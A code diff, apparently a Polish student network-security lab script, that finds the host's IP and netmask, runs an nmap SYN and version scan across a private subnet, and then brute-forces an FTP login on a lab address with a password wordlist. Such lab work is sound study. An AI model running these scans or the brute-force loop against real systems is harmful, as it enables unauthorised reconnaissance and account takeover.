@@ -1,0 +1,70 @@
+#Zadanie 1 i 2 - ustalanie własnego adresu IP oraz maski podsieci.(używa "ifconfig", więc zadziała jedynie na Linuxie)
+
+import subprocess
+
+output = subprocess.check_output(['ifconfig', 'eth0']).decode()
+
+ip_address = output.split('inet ')[1].split(' ')[0]
+netmask = output.split('netmask ')[1].split(' ')[0]
+
+print(f"IP address: {ip_address}")
+print(f"Netmask: {netmask}")
+
+#Zadanie 3,4,5 - ustalanie adresów IP w danej podsieci oraz otwartych portów, ustalanie nazwy i wersji usług.
+
+import nmap
+import ipaddress
+
+
+ip_addr = "192.168.0.235"
+netmask = "255.255.255.0"
+
+
+network = ipaddress.IPv4Network(ip_addr + "/" + netmask, False)
+
+
+scanner = nmap.PortScanner()
+
+
+for ip in network:
+    ip_str = str(ip)
+    if ip_str != ip_addr:
+        scanner.scan(ip_str, arguments='-sS -sV')
+        for host in scanner.all_hosts():
+            if scanner[host].state() == 'up':
+                print(f"Host: {host}, state: {scanner[host].state()}")
+                with open(f"{host}_ports.txt", "w") as f:
+                    for proto in scanner[host].all_protocols():
+                        print(f"Protocol: {proto}")
+                        ports = scanner[host][proto].keys()
+                        for port in ports:
+                            state = scanner[host][proto][port]['state']
+                            if state == 'open':
+                                service = scanner[host][proto][port]['name']
+                                version = scanner[host][proto][port]['version']
+                                product = scanner[host][proto][port]['product']
+                                extra_info = scanner[host][proto][port]['extrainfo']
+                                print(f"Port: {port}\tState: {state}\tService: {service}\tVersion: {version}\tProduct: {product}\tExtra Info: {extra_info}")
+                                f.write(f"Port: {port}\tState: {state}\tService: {service}\tVersion: {version}\tProduct: {product}\tExtra Info: {extra_info}\n")
+
+
+# Zadanie 6 - atak brute force na usługę FTP
+
+import ftplib
+
+targethost = "192.168.0.241"
+ftpserver = ftplib.FTP()
+
+with open('/home/kali/Downloads/krotkie_pass') as f:
+    lines = f.read().splitlines()
+
+for user in lines:
+    for password in lines:
+        print(f"Trying: {user}:{password}")
+        try:
+            ftpserver.connect(targethost, 21, timeout=2)
+            ftpserver.login(user, password)
+            print("Opened")
+            ftpserver.close()
+        except:
+            print("Wrong login data")
